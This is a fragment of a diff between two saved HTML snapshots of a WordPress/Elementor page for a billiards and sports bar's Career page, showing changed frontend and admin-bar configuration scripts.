+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close","a11yCarouselPrevSlideMessage":"Previous slide","a11yCarouselNextSlideMessage":"Next slide","a11yCarouselFirstSlideMessage":"This is the first slide","a11yCarouselLastSlideMessage":"This is the last slide","a11yCarouselPaginationBulletMessage":"Go to slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile Portrait","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Landscape","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet Portrait","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet Landscape","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Laptop","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Widescreen","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.33.4","is_static":false,"experimentalFeatures":{"e_font_icon_svg":true,"additional_custom_breakpoints":true,"container":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"nested-elements":true,"home_screen":true,"global_classes_should_enforce_capabilities":true,"e_variables":true,"cloud-library":true,"e_opt_in_v4_page":true,"import-export-customization":true},"urls":{"assets":"https:\/\/utimebilliards.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/utimebilliards.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/utimebilliards.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"f5f6e510e4"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","woocommerce_notices_elements":[],"hello_header_logo_type":"logo","hello_header_menu_layout":"horizontal","hello_footer_logo_type":"logo"},"post":{"id":267,"title":"Career%20%E2%80%93%20U-TIME%20International%20Billiards%20and%20Sports%20Bar","excerpt":"","featuredImage":false},"user":{"roles":["administrator"]}};
 //# sourceURL=elementor-frontend-js-before
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.33.4" id="elementor-frontend-js"></script>
@@ -2113,7 +1977,7 @@ var shopengineLoopProductConfig = {"add_to_cart":"Add to Cart","quick_view":"Qui
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/shopengine/widgets/init/assets/js/widgets.js?ver=4.8.7" id="shopengine-elementor-script-js"></script>
 <script id="elementor-admin-bar-js-before">
-var elementorAdminBarConfig = {"elementor_edit_page":{"id":"elementor_edit_page","title":"Edit with Elementor","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=303&action=elementor","children":{"36":{"id":"elementor_edit_doc_36","title":"Header","sub_title":"Header","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=36&action=elementor"},"31":{"id":"elementor_edit_doc_31","title":"Footer","sub_title":"Footer","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=31&action=elementor"},"317":{"id":"elementor_edit_doc_317","title":"Private Event Inquiry","sub_title":"Popup","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=317&action=elementor"},"253":{"id":"elementor_edit_doc_253","title":"VIP Sign-up Popup","sub_title":"Popup","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=253&action=elementor"},"222":{"id":"elementor_edit_doc_222","title":"VIP Sign-up Form","sub_title":"Section","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=222&action=elementor"},"318":{"id":"elementor_site_settings","title":"Site Settings","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=303&action=elementor&active-document=11","class":"elementor-site-settings","parent_class":"elementor-second-section"},"319":{"id":"elementor_app_site_editor","title":"Theme Builder","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/admin.php?page=elementor-app&ver=3.33.4#\/site-editor","class":"elementor-app-link","parent_class":"elementor-second-section"},"320":{"id":"elementor_site_clear_cache","title":"Clear Files &amp; Data","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/admin-post.php?action=elementor_site_clear_cache&_wpnonce=f70e946905"}}}};
+var elementorAdminBarConfig = {"elementor_edit_page":{"id":"elementor_edit_page","title":"Edit with Elementor","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=267&action=elementor","children":{"36":{"id":"elementor_edit_doc_36","title":"Header","sub_title":"Header","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=36&action=elementor"},"275":{"id":"elementor_edit_doc_275","title":"Career Form","sub_title":"Section","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=275&action=elementor"},"31":{"id":"elementor_edit_doc_31","title":"Footer","sub_title":"Footer","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=31&action=elementor"},"317":{"id":"elementor_edit_doc_317","title":"Private Event Inquiry","sub_title":"Popup","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=317&action=elementor"},"253":{"id":"elementor_edit_doc_253","title":"VIP Sign-up Popup","sub_title":"Popup","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=253&action=elementor"},"222":{"id":"elementor_edit_doc_222","title":"VIP Sign-up Form","sub_title":"Section","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=222&action=elementor"},"318":{"id":"elementor_site_settings","title":"Site Settings","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/post.php?post=267&action=elementor&active-document=11","class":"elementor-site-settings","parent_class":"elementor-second-section"},"319":{"id":"elementor_app_site_editor","title":"Theme Builder","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/admin.php?page=elementor-app&ver=3.33.4#\/site-editor","class":"elementor-app-link","parent_class":"elementor-second-section"},"320":{"id":"elementor_site_clear_cache","title":"Clear Files &amp; Data","sub_title":"Site","href":"https:\/\/utimebilliards.com\/wp-admin\/admin-post.php?action=elementor_site_clear_cache&_wpnonce=f70e946905"}}}};
 //# sourceURL=elementor-admin-bar-js-before
 </script>
 <script src="https://utimebilliards.com/wp-content/plugins/elementor/assets/js/elementor-admin-bar.min.js?ver=3.33.4" id="elementor-admin-bar-js"></script>
@@ -2193,4 +2057,3 @@ setTimeout(function() {
 
 </body>
 </html>
-
